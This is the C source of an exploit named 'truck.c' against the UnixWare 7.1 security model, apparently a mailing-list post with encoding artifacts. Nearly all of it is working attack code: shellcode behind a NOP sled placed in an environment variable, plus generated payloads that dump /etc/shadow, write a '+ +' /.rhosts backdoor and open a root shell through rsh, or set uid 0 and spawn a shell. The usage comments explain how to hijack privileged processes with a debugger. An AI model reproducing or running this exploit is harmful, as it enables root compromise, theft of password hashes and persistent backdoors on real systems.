/** =

 ** "Its a hole you could drive a truck through." =

 **                        -Aleph One
 **
 ** truck.c UnixWare 7.1 security model exploit
 ** Demonstrates how we own privileged processes =

 ** =

 ** Usage: cc -o truck truck.c
 ** ./truck <filetype>  where filetype is 1, 2 or 3 =

 ** (for dacread, dacwrite and setuid, respectively)
 **
 ** This will put $XNEC in the environment and run a shell.
 ** From there you must use gdb/debug to load a file of the
 ** type you chose (by checking /etc/security/tcb/privs)
 ** and setting a breakpoint at _init via "break _init".
 ** When you "run" and break at _init, change your EIP
 ** to something between 0x8046000 and 0x8048000 with =

 ** "set $eip =3D 0x8046b75" and "continue" twice.
 **
 **
 ** Brock Tellier btellier@usa.net
 **/ =



#include <stdlib.h>
#include <stdio.h>

char scoshell[]=3D /* This isn't a buffer overflow! really! */
"\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"
"\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"
"\xff\xff/tmp/sm\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";

                       =

#define LEN 3500
#define NOP 0x90

#define DACWRITE "void main() { system(\"echo + + > /.rhosts; chmod 700 \=

/.rhosts; chown root:sys /.rhosts; rsh -l root localhost sh -i \
\"); }\n"
#define DACREAD  "void main() { system(\"cat /etc/shadow\");}\n"
#define SETUID  "void main() { setreuid(0,0);system(\"/bin/sh\"); }\n"

void usage(int ftype) {
    fprintf(stderr, "Error: Usage: truck [filetype]\n");
    fprintf(stderr, "Where filetype is one of the following: \n");
    fprintf(stderr, "1 dacread\n2 dacwrite\n3 setuid\n");
    fprintf(stderr, "Note: if file has allprivs, use setuid\n");
}
void buildsm(int ftype) {
  FILE *fp;
  char cc[100];
  fp =3D fopen("/tmp/sm.c", "w");

  if (ftype =3D=3D 1) fprintf(fp, DACREAD);
    else if(ftype =3D=3D 2) fprintf(fp, DACWRITE);
    else if(ftype =3D=3D 3) fprintf(fp, SETUID);

  fclose(fp);
  snprintf(cc, sizeof(cc), "cc -o /tmp/sm /tmp/sm.c");
  system(cc);

}

int main(int argc, char *argv[]) {

int i;
int buflen =3D LEN;
char buf[LEN]; =

int filetype =3D 0;
char filebuf[20]; =


 if(argc > 2 || argc =3D=3D 1) {
    usage(filetype);
    exit(0); =

 }

 if ( argc > 1 ) filetype=3Datoi(argv[1]);
 if ( filetype > 3 || filetype < 1 ) { usage(filetype); exit(-1); }
 buildsm(filetype);

fprintf(stderr, "\nUnixWare 7.1 security model exploit\n");
fprintf(stderr, "Brock Tellier btellier@usa.net\n\n");

memset(buf,NOP,buflen);
memcpy(buf+(buflen - strlen(scoshell) - 1),scoshell,strlen(scoshell));

memcpy(buf, "XNEC=3D", 5);
putenv(buf);
buf[buflen - 1] =3D 0;

system("/bin/sh");
exit(0);
}
